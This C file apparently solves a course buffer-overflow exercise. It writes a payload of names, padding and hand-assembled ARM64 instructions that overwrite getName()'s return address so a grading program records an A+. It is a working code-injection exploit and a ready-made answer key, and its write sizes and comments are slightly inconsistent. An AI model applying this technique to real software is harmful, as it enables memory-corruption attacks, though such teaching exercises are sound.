#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

int main (void) {
    FILE *psFile;
    char* partners = "Connor & Laura";
    int i;
    unsigned int uiCmd;
    unsigned int uiMovAdr;

    psFile = fopen("dataAplus", "w");

    fprintf(psFile, "%s", partners);

    for (i = 0; i < 8; i++) {
        fprintf(psFile, "%c", '\0');
    }
    fprintf(psFile, "%c", 'A');
    fprintf(psFile, "%c", '\0');

    uiCmd = MiniAssembler_adr(0, 0x42006E, 0x420070);
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    uiCmd = MiniAssembler_bl(0x400690, 0x420074);
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* 0x420078      | movw0, 'A' */
    uiCmd = MiniAssembler_mov(0, '+');
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* 0x42007C      |adr x1, grade */
    uiCmd = MiniAssembler_adr(1, 0x420044, 0x42007C);
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* 0x420080      |strb w0, [x1] */
    uiCmd = MiniAssembler_strb(0, 1);
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* 0x420084      | b 0x40089c   */
    uiCmd = MiniAssembler_b(0x40089c, 0x420084);
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* overwrite getName()'s x30 with address where mov command begins. */
    uiMovAdr = 0x420078;
    fwrite(&uiMovAdr, sizeof(unsigned long), 1, psFile);

    /* close the file */
    fclose(psFile);

    return 0;
}
